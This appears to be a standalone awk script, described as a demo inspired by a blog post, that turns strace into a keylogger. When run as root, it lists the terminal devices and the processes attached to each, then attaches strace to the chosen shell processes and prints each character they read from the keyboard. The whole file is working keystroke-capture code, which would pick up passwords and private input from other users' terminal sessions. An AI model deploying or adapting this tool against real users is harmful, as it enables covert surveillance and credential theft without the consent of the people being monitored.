#!/usr/bin/awk -f

# this program inspired by this blog post:
# https://www.securitynik.com/2014/04/the-poor-mans-keylogger-strace.html

function print_help() {
    printf "This is a demo of how to use strace as a "
    printf "\"poor man's keylogger\".\n"
    printf "Usage: sudo ./strace_keylogger.awk <PIDs (OPTIONAL)>\n"
    exit 1
}

# interactively prompts for a pts and returns a comma-delimited string with pids
function get_pids() {
    # prompt user for which pts they want to trace
    cmd="find /dev/pts/ -mindepth 1 -type c | grep -v '/dev/pts/ptmx' | sort -V"
    size = 0
    while( ( cmd | getline ) > 0 ) {
        pts[size++] = $0
    }
    close(cmd)
    for( i = 0; i < size; i++ ) {
        # list procs associated with a pts
        cmd = "sudo fuser " pts[i] " 2>/dev/null"; cmd | getline
        pid_lists[i] = $0; ret = close(cmd)

        # fuser gives a space-delimited list, change to comma-delimited
        pid_lists[i] = substr(pid_lists[i], 2, length(pid_lists[i]) - 1)
        gsub(" ", ",", pid_lists[i])
    }

    for( i = 0; i < size; i++ ) {
        print i ":", pts[i]
        print "\tassociated processes:"
        system("ps -p " pid_lists[i] " -o pid,cmd | sed 's/^/\t\t/g'")
    }
    printf "Enter a number to start tracing that shell process, or 'q' to quit: "
    getline selection < "-"

    if(selection == "q" || selection == "Q") {
        exit 0
    }

    if(selection ~ /[0-9]+/ && selection in pid_lists) {
        return pid_lists[selection]
    }
    else {
        print "Did not understand selection, aborting"
        exit 1
    }
}

BEGIN {
    # print "running as user " ENVIRON["USER"]
    if(ENVIRON["USER"] == "root" && (ARGC == 1 || ARGC == 2)) {
        if(ARGC == 1) {
            pids = get_pids()
        }
        else {
            if(ARGV[1] !~ /[0-9]+/) {
                print_help()
            }
            pids = ARGV[1]
        }
        FS=","
        cmd="strace -p " pids  " -tt -qq -f -e read 2>&1"
        while( ( cmd | getline ) > 0 ) {
            if($0 ~ /read\(0/ || $0 ~ /read\(.* 1\)/) {
                for(i = 1; i <= NF; i++) {
                    if($i ~ /read/) {
                        elem = $(i+1)
                        elem = substr(elem, 2)
                        if(elem == "\"\\r\"" ||
                           elem == "\"\\n\"" ||
                           elem == "\"\"") {
                            print elem
                        }
                        else {
                            printf elem ", "
                        }
                    }
                }
            }
        } 
        close(cmd)
    }
    else {
        print_help()
    }
}
